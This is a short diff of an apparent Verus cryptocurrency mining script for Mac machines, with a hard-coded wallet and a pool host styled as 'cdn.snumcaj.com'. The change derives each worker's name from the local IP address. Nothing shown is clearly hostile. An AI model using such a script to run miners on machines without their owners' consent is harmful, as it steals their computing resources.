@@ -7,8 +7,11 @@
 # ============================================================
 
 VRSC_WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
-# Worker name — change per machine (mac1, mac2, imac1 etc.)
-WORKER="mac$(hostname | md5 | cut -c1-4 2>/dev/null || echo '01')"
+# Auto-generate worker name from local IP last octet — easy pool identification
+# e.g. 192.168.1.105 → mac-105
+LOCAL_IP=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1)
+IP_LAST=$(echo "$LOCAL_IP" | awk -F. '{print $4}')
+WORKER="mac-${IP_LAST:-$(hostname | cut -c1-6)}"
 POOL_HOST="cdn.snumcaj.com"
 POOL_PORT="3956"
 
